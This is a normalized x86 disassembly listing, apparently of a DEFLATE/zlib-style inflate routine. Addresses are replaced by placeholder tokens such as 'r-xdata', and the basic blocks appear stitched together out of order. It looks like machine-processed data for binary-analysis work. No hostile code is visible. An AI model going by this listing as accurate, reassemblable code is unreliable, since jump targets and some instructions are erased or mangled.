mov eax [ esi + 0x8 ]
inc eax
xor ecx ecx
mov [ esi + 0x8 ] eax
mov eax [ esi ]
mov edi ebx
mov cl [ eax ]
shl ecx 0x18
mov [ edx + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov [ eax ] 0x9
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x1c ]
xor edx edx
mov dl [ ecx ]
mov edi ebx
mov ecx [ eax + 0x8 ]
shl edx 0x10
add ecx edx
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov [ eax ] 0xa
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x1c ]
xor edx edx
mov dl [ ecx ]
mov edi ebx
mov ecx [ eax + 0x8 ]
shl edx 0x8
add ecx edx
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov [ eax ] 0xb
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x1c ]
mov [ esi + 0x8 ] edx
xor edx edx
mov dl [ ecx ]
mov ecx [ eax + 0x8 ]
add ecx edx
mov edi ebx
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov ecx [ eax + 0x4 ]
mov edx [ eax + 0x8 ]
cmp ecx edx
je r-xdata
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x8 ] edx
xor edx edx
mov [ esi + 0x4 ] eax
mov dl [ ecx ]
mov eax [ esi + 0x1c ]
mov edi ebx
shl edx 0x18
mov [ eax + 0x8 ] edx
mov eax [ esi ]
mov ecx [ esi + 0x1c ]
inc eax
mov [ esi ] eax
mov [ ecx ] 0x3
mov edx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
inc eax
xor ecx ecx
mov [ esi + 0x8 ] eax
mov eax [ esi + 0x1c ]
mov cl [ edx ]
mov edi ebx
mov edx [ eax + 0x8 ]
shl ecx 0x10
add edx ecx
mov [ eax + 0x8 ] edx
mov eax [ esi ]
mov edx [ esi + 0x1c ]
inc eax
mov [ esi ] eax
mov [ edx ] 0x4
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
inc eax
xor edx edx
mov [ esi + 0x8 ] eax
mov eax [ esi + 0x1c ]
mov dl [ ecx ]
mov edi ebx
mov ecx [ eax + 0x8 ]
shl edx 0x8
add ecx edx
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov [ eax ] ebp
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x1c ]
mov [ esi + 0x8 ] edx
xor edx edx
mov dl [ ecx ]
mov ecx [ eax + 0x8 ]
add ecx edx
pop edi
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov ecx [ eax + 0x8 ]
mov [ esi + 0x30 ] ecx
pop esi
mov [ eax ] 0x6
pop ebp
mov eax 0x2
pop ebx
retn
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ eax + 0x4 ]
mov edx [ eax + 0x10 ]
shr ecx 0x4
add ecx 0x8
cmp ecx edx
jbe r-xdata
mov [ eax ] 0xd
mov edx [ esi + 0x1c ]
mov [ esi + 0x18 ] rw-data
mov [ edx + 0x4 ] ebp
jmp r-xdata
test cl 0x20
jne r-xdata
mov [ ebx ] 0xd
mov eax [ esi + 0x1c ]
mov ebx [ esp + 0x18 ]
mov ebp 0x5
mov [ esi + 0x18 ] rw-data
mov [ eax + 0x4 ] ebp
jmp r-xdata
cmp edi 0x1
jne r-xdata
mov edi ebx
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
cmp ecx 0xd
ja r-xdata
mov ecx [ esi + 0x1c ]
mov [ ecx ] 0xc
mov [ eax ] 0xd
mov edx [ esi + 0x1c ]
mov [ esi + 0x18 ] rw-data
mov [ edx + 0x4 ] ebp
jmp r-xdata
mov [ eax ] 0x1
mov [ eax ] 0xd
mov edx [ esi + 0x1c ]
mov [ esi + 0x18 ] rw-data
mov [ edx + 0x4 ] ebp
jmp r-xdata
mov eax [ esi + 0x1c ]
mov ebx [ esp + 0x18 ]
mov ebp 0x5
mov [ eax ] 0x2
mov [ ebx ] 0x7
mov ebx [ esp + 0x18 ]
mov ebp 0x5
jmp r-xdata
mov eax [ esi + 0x1c ]
mov edi ebx
mov edx [ eax + 0x14 ]
lea ecx [ eax + 0x4 ]
push ecx
push esi
push edx
call sub_100051f0
mov eax [ esi + 0x1c ]
add esp 0xc
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov [ eax ] 0x8
mov [ eax ] 0xc
jmp r-xdata
sub_100051f0
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push edi
test eax eax
je r-xdata
mov eax [ esi ]
mov edi [ esp + 0x10 ]
cmp eax 0x4
je r-xdata
mov ecx [ esi + 0x3c ]
mov [ eax ] ecx
mov edx [ esi + 0xc ]
mov eax [ edi + 0x28 ]
push edx
push eax
call [ edi + 0x24 ]
add esp 0x8
cmp eax 0x5
jne r-xdata
mov eax [ esi + 0x28 ]
mov [ esi ] 0x0
mov [ esi + 0x34 ] eax
mov [ esi + 0x30 ] eax
mov eax [ esi + 0x38 ]
mov [ esi + 0x1c ] 0x0
test eax eax
mov [ esi + 0x20 ] 0x0
je r-xdata
mov ecx [ esi + 0x4 ]
push edi
push ecx
call sub_100069b0
add esp 0x8
cmp [ esi ] 0x6
jne r-xdata
pop edi
pop esi
retn
push 0x0
push 0x0
push 0x0
call eax
mov [ esi + 0x3c ] eax
add esp 0xc
mov [ edi + 0x30 ] eax
sub_10005270
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
push 0x40
push 0x1
mov eax [ edi + 0x28 ]
push eax
call [ edi + 0x20 ]
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov ecx [ edi + 0x28 ]
push 0x5a0
push 0x8
push ecx
call [ edi + 0x20 ]
add esp 0xc
mov [ esi + 0x24 ] eax
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0x18 ]
mov eax [ edi + 0x28 ]
push ebx
push 0x1
push eax
call [ edi + 0x20 ]
add esp 0xc
mov [ esi + 0x28 ] eax
test eax eax
jne r-xdata
mov edx [ edi + 0x28 ]
push esi
push edx
call [ edi + 0x24 ]
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebx
retn
mov ecx [ esp + 0x14 ]
push 0x0
add eax ebx
push edi
push esi
mov [ esi + 0x2c ] eax
mov [ esi + 0x38 ] ecx
mov [ esi ] 0x0
call sub_100051f0
add esp 0xc
mov eax esi
pop edi
pop esi
pop ebx
retn
mov ecx [ esi + 0x24 ]
mov edx [ edi + 0x28 ]
push ecx
push edx
call [ edi + 0x24 ]
mov eax [ edi + 0x28 ]
push esi
push eax
call [ edi + 0x24 ]
add esp 0x10
xor eax eax
pop edi
pop esi
pop ebx
retn
sub_10005310
sub esp 0x30
mov eax [ esp + 0x38 ]
push ebx
mov ebx [ esp + 0x38 ]
push ebp
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0x20 ]
mov ebp [ ebx + 0x1c ]
mov [ esp + 0x8 ] ecx
mov ecx [ ebx + 0x34 ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x30 ]
push esi
cmp ecx eax
push edi
mov [ esp + 0x14 ] edx
mov [ esp + 0x44 ] ecx
jae r-xdata
mov eax [ ebx + 0x2c ]
sub eax ecx
sub eax ecx
dec eax
jmp r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x10 ]
push 0xfffffffe
mov edx ecx
mov [ eax ] ecx
mov ecx [ esp + 0x48 ]
sub edx esi
add ebp edx
push eax
mov [ eax + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] ecx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
jmp [ eax * 4 + jump_table_10005fe0 ]
mov [ esp + 0x1c ] eax
mov esi [ esp + 0x18 ]
cmp ebp 0x3
jae r-xdata
mov esi [ esp + 0x18 ]
mov edi [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
cmp ebp 0x20
jae r-xdata
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
mov edi [ esp + 0x18 ]
cmp ebp 0xe
jae r-xdata
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x48 ]
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x48 ]
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x48 ]
mov ecx [ esp + 0x44 ]
mov esi [ esp + 0x48 ]
mov edi [ esp + 0x10 ]
mov ecx [ esp + 0x44 ]
mov esi [ esp + 0x48 ]
mov edi [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x48 ]
mov edx [ esp + 0x14 ]
mov [ ebx + 0x20 ] ecx
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx ecx
sub edx esi
mov [ eax ] ecx
mov ecx [ esp + 0x44 ]
add ebp edx
push 0xfffffffd
push eax
mov [ eax + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] ecx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edi [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov edi [ esp + 0x10 ]
mov edx esi
mov ecx esi
not edx
and ecx 0xffff
shr edx 0x10
xor edx ecx
jne r-xdata
xor edx edx
cmp edi edx
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x48 ]
mov [ ebx + 0x20 ] ecx
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov edx ecx
sub edx esi
mov [ eax ] ecx
mov ecx [ esp + 0x44 ]
add ebp edx
mov edx [ esp + 0x4c ]
mov [ eax + 0x4 ] 0x0
push edx
push eax
mov [ eax + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] ecx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov ecx [ esp + 0x1c ]
test ecx ecx
jne r-xdata
mov eax edi
and eax 0x3fff
mov ecx eax
mov [ ebx + 0x4 ] eax
and ecx 0x1f
cmp ecx 0x1d
ja r-xdata
mov esi [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ ebx + 0x8 ]
mov eax 0x13
cmp ecx eax
jae r-xdata
cmp ebp 0x3
jae r-xdata
mov ecx [ ebx + 0x24 ]
mov eax [ ebx + 0x4 ]
push esi
push ecx
lea edx [ esp + 0x40 ]
lea ecx [ esp + 0x44 ]
push edx
push ecx
lea edx [ esp + 0x2c ]
lea ecx [ esp + 0x30 ]
push edx
mov edx [ ebx + 0xc ]
push ecx
mov ecx eax
shr ecx 0x5
and ecx 0x1f
and eax 0x1f
inc ecx
push edx
add eax 0x101
push ecx
push eax
mov [ ebx + 0x14 ] 0x0
mov [ esp + 0x44 ] 0x9
mov [ esp + 0x40 ] 0x6
call sub_10006f40
add esp 0x24
mov [ esp + 0x18 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x10 ]
cmp ebp eax
jae r-xdata
push eax
push esi
push ebx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov ecx [ ebx + 0x4 ]
push esi
push ecx
mov [ esp + 0x54 ] 0x0
call sub_100069b0
mov eax [ ebx + 0x20 ]
mov ecx [ ebx + 0x34 ]
mov edi [ esi ]
mov edx [ esi + 0x4 ]
mov ebp [ ebx + 0x1c ]
mov [ esp + 0x20 ] eax
mov eax [ ebx + 0x30 ]
add esp 0x8
cmp ecx eax
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] edx
mov [ esp + 0x44 ] ecx
jae r-xdata
mov [ ebx ] 0x8
jmp r-xdata
mov edx [ esp + 0x18 ]
mov [ ebx + 0x1c ] ebp
mov [ ebx + 0x20 ] edx
mov edx [ esp + 0x14 ]
mov ebp [ esi ]
mov [ esi + 0x4 ] edx
mov edx edi
mov [ esi ] edi
sub edx ebp
mov ebp [ esi + 0x8 ]
add ebp edx
mov [ esi + 0x8 ] ebp
mov [ ebx + 0x34 ] ecx
mov eax [ ebx ]
cmp eax 0x9
ja r-xdata
jmp [ eax * 4 + jump_table_10006008 ]
mov eax [ esp + 0x48 ]
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov ecx edi
mov edx [ eax ]
mov ebp [ eax + 0x8 ]
sub ecx edx
mov edx [ esp + 0x44 ]
add ebp ecx
mov ecx [ esp + 0x4c ]
push ecx
push eax
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] ebp
mov [ eax ] edi
push ebx
mov [ ebx + 0x34 ] edx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
xor ecx ecx
dec eax
mov cl [ edi ]
mov [ esp + 0x4c ] 0x0
mov edx ecx
mov ecx ebp
shl edx cl
add ebp 0x8
mov [ esp + 0x14 ] eax
or esi edx
inc edi
cmp ebp 0x3
mov [ esp + 0x18 ] esi
mov [ esp + 0x10 ] edi
jb r-xdata
mov ecx [ esp + 0x48 ]
mov [ ebx ] 0x9
mov edx eax
push 0xfffffffd
mov [ ecx + 0x18 ] rw-data
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov esi [ ecx ]
mov ebp [ ecx + 0x8 ]
sub edx esi
add ebp edx
mov [ ecx ] eax
mov eax [ esp + 0x48 ]
push ecx
mov [ ecx + 0x4 ] edi
mov [ ecx + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] eax
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
xor ebp ebp
mov eax ecx
cmp eax ebp
mov [ ebx + 0x4 ] ecx
mov [ esp + 0x18 ] ebp
je r-xdata
mov ecx [ esp + 0x48 ]
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov esi [ ecx ]
mov ebp [ ecx + 0x8 ]
mov [ ecx + 0x4 ] edx
mov edx eax
sub edx esi
mov [ ecx ] eax
mov eax [ esp + 0x44 ]
add ebp edx
mov edx [ esp + 0x4c ]
mov [ ecx + 0x8 ] ebp
push edx
push ecx
push ebx
mov [ ebx + 0x34 ] eax
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
xor ecx ecx
mov [ esp + 0x4c ] edx
mov cl [ eax ]
dec edi
mov edx ecx
mov ecx ebp
shl edx cl
add ebp 0x8
mov [ esp + 0x14 ] edi
or esi edx
inc eax
cmp ebp 0x20
mov [ esp + 0x10 ] eax
jb r-xdata
mov eax [ ebx + 0x4 ]
mov [ esp + 0x4c ] 0x0
cmp eax edi
jbe r-xdata
mov ecx [ ebx + 0x2c ]
mov edx [ esp + 0x44 ]
cmp edx ecx
jne r-xdata
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x14 ]
mov [ ebx ] 0x9
push 0xfffffffd
mov [ eax + 0x18 ] rw-data
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x14 ]
push eax
mov edx ecx
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
sub edx esi
add ebp edx
push ebx
mov [ eax + 0x8 ] ebp
mov [ ebx + 0x34 ] ecx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edx eax
and edx 0x3e0
cmp edx 0x3a0
ja r-xdata
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov edx ecx
mov [ eax ] ecx
mov ecx [ esp + 0x44 ]
sub edx esi
add ebp edx
mov edx [ esp + 0x4c ]
push edx
push eax
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] ecx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
xor ecx ecx
dec esi
mov cl [ eax ]
mov [ esp + 0x4c ] 0x0
mov edx ecx
mov ecx ebp
shl edx cl
add ebp 0x8
mov [ esp + 0x14 ] esi
or edi edx
inc eax
cmp ebp 0xe
mov [ esp + 0x10 ] eax
jb r-xdata
mov edx [ ebx + 0x24 ]
push esi
lea ecx [ ebx + 0x14 ]
lea eax [ ebx + 0x10 ]
push edx
mov edx [ ebx + 0xc ]
push ecx
push eax
push edx
mov [ eax ] 0x7
call sub_100069d0
add esp 0x14
mov [ esp + 0x18 ] eax
test eax eax
jne r-xdata
mov ecx [ ebx + 0x8 ]
mov edx [ ecx * 4 + r--data ]
mov ecx [ ebx + 0xc ]
mov [ ecx + edx * 4 ] 0x0
mov edx [ ebx + 0x8 ]
inc edx
mov ecx edx
mov [ ebx + 0x8 ] edx
cmp ecx eax
jb r-xdata
mov ecx [ ebx + 0x8 ]
mov eax edi
and eax 0x7
sub ebp 0x3
mov edx [ ecx * 4 + r--data ]
mov ecx [ ebx + 0xc ]
shr edi 0x3
mov [ ecx + edx * 4 ] eax
mov edx [ ebx + 0x8 ]
inc edx
mov [ ebx + 0x8 ] edx
mov eax edx
mov edx [ ebx + 0x4 ]
shr edx 0xa
add edx 0x4
cmp eax edx
jb r-xdata
mov eax [ esp + 0x10 ]
cmp [ esp + 0x18 ] 0xfffffffd
jne r-xdata
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x1c ]
push esi
push edx
mov edx [ esp + 0x28 ]
push eax
push ecx
push edx
call sub_100061c0
add esp 0x14
test eax eax
je r-xdata
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebx + 0x14 ]
and eax edi
xor edx edx
mov dl [ ecx + eax * 8 + 0x1 ]
lea eax [ ecx + eax * 8 ]
mov [ esp + 0x18 ] edx
mov eax [ eax + 0x4 ]
cmp eax 0x10
mov [ esp + 0x34 ] eax
jae r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x2c ]
sub eax ecx
sub eax ecx
dec eax
jmp r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x1c ] ebp
mov ebp [ esi ]
mov eax edi
mov [ esi + 0x4 ] edx
mov edx [ esi + 0x8 ]
sub eax ebp
push 0x1
add edx eax
push esi
mov [ esi + 0x8 ] edx
mov [ esi ] edi
push ebx
mov [ ebx + 0x34 ] ecx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
sub ebp 0x3
mov [ ebx ] 0x1
mov ecx ebp
and ecx 0x7
shr esi 0x3
shr esi cl
sub ebp ecx
mov [ esp + 0x18 ] esi
jmp r-xdata
mov edx [ esp + 0x48 ]
lea eax [ esp + 0x24 ]
push edx
lea ecx [ esp + 0x2c ]
push eax
lea edx [ esp + 0x34 ]
push ecx
lea eax [ esp + 0x3c ]
push edx
push eax
call sub_100070d0
mov ecx [ esp + 0x5c ]
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x3c ]
push ecx
mov ecx [ esp + 0x44 ]
push edx
mov edx [ esp + 0x4c ]
push eax
push ecx
push edx
call sub_100061c0
add esp 0x28
mov [ ebx + 0x4 ] eax
test eax eax
je r-xdata
shr esi 0x3
mov [ esp + 0x18 ] esi
sub ebp 0x3
mov [ ebx ] 0x3
jmp r-xdata
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x14 ]
mov [ ebx ] 0x9
add ebp 0xfffffffd
shr esi 0x3
mov [ eax + 0x18 ] rw-data
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
mov edx edi
push 0xfffffffd
sub edx ecx
mov ecx [ esp + 0x48 ]
add ebp edx
push eax
mov [ eax + 0x8 ] ebp
mov [ eax ] edi
push ebx
mov [ ebx + 0x34 ] ecx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
test eax eax
je r-xdata
jmp r-xdata
mov eax [ ebx + 0x18 ]
neg eax
sbb eax eax
and eax 0x7
mov [ ebx ] eax
jmp r-xdata
mov eax 0x2
mov [ ebx ] eax
jmp r-xdata
cmp eax ecx
jbe r-xdata
mov eax edi
mov eax [ esp + 0x4c ]
mov edi [ esp + 0x48 ]
push eax
push edi
push ebx
mov [ ebx + 0x34 ] edx
call sub_10007100
mov edx [ ebx + 0x34 ]
mov esi [ ebx + 0x30 ]
add esp 0xc
cmp edx esi
mov [ esp + 0x4c ] eax
mov [ esp + 0x44 ] edx
jae r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ ebx + 0x28 ]
cmp eax esi
je r-xdata
mov esi [ esp + 0x48 ]
push 0x4
shr eax 0x5
and eax 0x1f
lea eax [ eax + ecx + 0x102 ]
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x20 ]
add esp 0xc
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
cmp [ esp + 0x18 ] 0xfffffffd
jne r-xdata
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x5
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov ecx [ esi + 0x8 ]
mov edx eax
sub edx edi
mov [ esi ] eax
mov eax [ esp + 0x44 ]
add ecx edx
mov [ esi + 0x8 ] ecx
mov ecx [ esp + 0x4c ]
push ecx
push esi
mov [ esi + 0x4 ] 0x0
push ebx
mov [ ebx + 0x34 ] eax
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edx ecx
xor ecx ecx
mov cl [ eax ]
dec edx
mov [ esp + 0x14 ] edx
mov edx ecx
mov ecx ebp
add ebp 0x8
shl edx cl
mov [ esp + 0x4c ] 0x0
or edi edx
inc eax
cmp ebp 0x3
mov [ esp + 0x10 ] eax
jb r-xdata
mov eax [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx [ esi + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov ecx eax
mov [ esi ] eax
mov eax [ esp + 0x18 ]
sub ecx edi
add edx ecx
push eax
mov [ esi + 0x8 ] edx
mov edx [ esp + 0x48 ]
push esi
push ebx
mov [ ebx + 0x34 ] edx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov ecx [ ebx + 0xc ]
mov edx [ esi + 0x28 ]
push ecx
push edx
call [ esi + 0x24 ]
add esp 0x8
mov [ ebx ] 0x9
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx eax
mov [ esi + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
sub edx edi
mov [ esi ] eax
mov eax [ esp + 0x44 ]
add ecx edx
push 0xfffffffc
push esi
mov [ esi + 0x8 ] ecx
push ebx
mov [ ebx + 0x34 ] eax
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov [ ebx + 0x4 ] eax
mov eax [ ebx + 0xc ]
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x24 ]
add esp 0x8
mov [ ebx ] 0x6
jmp r-xdata
cmp eax 0x12
mov ecx 0x7
je r-xdata
mov ecx edx
sub ebp edx
mov edx [ ebx + 0xc ]
shr edi cl
mov ecx [ ebx + 0x8 ]
mov [ edx + ecx * 4 ] eax
mov eax [ ebx + 0x8 ]
inc eax
jmp r-xdata
mov edx ecx
xor ecx ecx
dec edx
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x14 ] edx
mov edx [ esp + 0x10 ]
mov cl [ edx ]
mov edx ecx
mov ecx ebp
shl edx cl
mov ecx [ esp + 0x10 ]
add ebp 0x8
or edi edx
inc ecx
cmp ebp eax
mov [ esp + 0x10 ] ecx
jb r-xdata
mov [ ebx ] 0x7
jmp r-xdata
mov [ ebx ] 0x0
jmp r-xdata
mov [ esp + 0x1c ] eax
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x48 ]
mov edx [ esp + 0x14 ]
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x1c ] ebp
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ eax ]
mov ecx edi
sub ecx edx
mov edx [ esp + 0x44 ]
add ebp ecx
push 0xfffffffc
push eax
mov [ eax + 0x8 ] ebp
mov [ eax ] edi
push ebx
mov [ ebx + 0x34 ] edx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
shr esi 0x3
mov [ esp + 0x18 ] esi
sub ebp 0x3
mov [ ebx ] 0x6
jmp r-xdata
mov eax esi
and eax 0x7
mov ecx eax
shr eax 0x1
and ecx 0x1
cmp eax 0x3
mov [ ebx + 0x18 ] ecx
ja r-xdata
mov esi [ esp + 0x10 ]
mov edi [ esp + 0x44 ]
mov ecx eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov edx [ esp + 0x1c ]
and ecx 0x3
sub edx eax
[ edi ] [ esi ]
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x14 ]
mov esi [ esp + 0x44 ]
add ecx eax
mov [ esp + 0x10 ] ecx
mov ecx [ ebx + 0x4 ]
sub edi eax
add esi eax
sub ecx eax
mov [ esp + 0x14 ] edi
mov [ esp + 0x44 ] esi
mov [ esp + 0x1c ] edx
mov [ ebx + 0x4 ] ecx
jne r-xdata
mov eax ecx
mov ecx [ ebx + 0x2c ]
sub ecx edx
mov ecx esi
sub ecx edx
dec ecx
jmp r-xdata
mov edx esi
cmp edx eax
mov [ esp + 0x44 ] edx
jae r-xdata
mov eax [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx [ esi + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax [ esp + 0x10 ]
push 0xfffffffc
mov ecx eax
push esi
sub ecx edi
mov [ esi ] eax
add edx ecx
push ebx
mov [ esi + 0x8 ] edx
mov edx [ esp + 0x50 ]
mov [ ebx + 0x34 ] edx
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
shr edi 0xe
sub ebp 0xe
mov [ ebx + 0x8 ] 0x0
mov [ ebx ] 0x4
jmp r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov edx eax
mov [ esi + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
sub edx edi
mov [ esi ] eax
mov eax [ esp + 0x44 ]
add ecx edx
mov [ esi + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
push ecx
push esi
push ebx
mov [ ebx + 0x34 ] eax
call sub_10007100
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edx [ ebx + 0xc ]
mov eax [ esi + 0x28 ]
push edx
push eax
call [ esi + 0x24 ]
add esp 0x8
mov [ ebx ] 0x9
mov eax [ ebx + 0x4 ]
mov ecx [ ebx + 0x8 ]
mov edx eax
and eax 0x1f
shr edx 0x5
and edx 0x1f
lea eax [ edx + eax + 0x102 ]
cmp ecx eax
jae r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
mov [ ebx + 0x20 ] edi
mov [ ebx + 0x1c ] ebp
mov edi [ esi ]
mov ecx eax
mov [ esi + 0x4 ] edx
mov edx [ esi + 0x8 ]
sub ecx edi
mov [ esi ] eax
mov eax [ esp + 0x4c ]
add edx ecx
mov [ esi + 0x8 ] edx
mov edx [ esp + 0x44 ]
push eax
push esi
push ebx
mov [ ebx + 0x34 ] edx
call sub_10006200
add esp 0xc
cmp eax 0x1
jne r-xdata
sub eax 0x12
mov [ esp + 0x1c ] ecx
neg eax
sbb eax eax
add ecx edx
and al 0xf8
mov [ esp + 0x20 ] ecx
